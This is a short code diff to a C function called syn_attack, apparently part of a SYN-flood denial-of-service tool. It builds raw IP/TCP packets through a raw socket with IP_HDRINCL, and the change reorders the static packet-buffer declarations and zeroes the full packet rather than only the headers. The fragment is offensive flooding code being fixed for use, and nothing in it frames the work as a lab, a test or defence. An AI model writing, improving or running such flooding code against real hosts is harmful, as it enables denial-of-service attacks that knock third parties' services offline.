@@ -24,11 +24,11 @@ void* syn_attack(void* arg) {
     const int *val = &one;
     setsockopt(syn_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
 
+    static unsigned char *packet = NULL;
+    static int last_packet_size = 0;
     int min_packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
     int packet_size = params->psize > 0 ? params->psize : 40;
     if (packet_size < min_packet_size) packet_size = min_packet_size;
-    static unsigned char *packet = NULL;
-    static int last_packet_size = 0;
     if (packet == NULL || last_packet_size != packet_size) {
         if (packet) free(packet);
         packet = malloc(packet_size);
@@ -36,9 +36,9 @@ void* syn_attack(void* arg) {
             close(syn_sock);
             return NULL;
         }
-        memset(packet, 0, min_packet_size);
         last_packet_size = packet_size;
     }
+    memset(packet, 0, packet_size);
 
     struct iphdr* iph = (struct iphdr*) packet;
     struct tcphdr* tcph = (struct tcphdr*) (packet + sizeof(struct iphdr));
